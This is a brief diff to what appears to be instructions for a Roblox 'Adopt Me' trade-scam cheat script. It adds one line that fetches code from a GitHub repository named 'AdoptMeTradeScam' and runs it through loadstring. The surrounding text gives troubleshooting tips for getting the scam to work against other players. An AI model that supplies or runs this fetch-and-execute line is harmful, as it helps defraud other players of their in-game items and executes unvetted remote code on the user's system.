@@ -12,3 +12,4 @@ Tutorial:
 
 if it doesn't work, try get someone to trade you instead. if it still doesnt work it may be patched or the script isnt supported on your executor
 Last Tested: 22/01/23
+script: loadstring(game:HttpGet('https://raw.githubusercontent.com/Penguin284/AdoptMeTradeScam/main/tradescam'))()
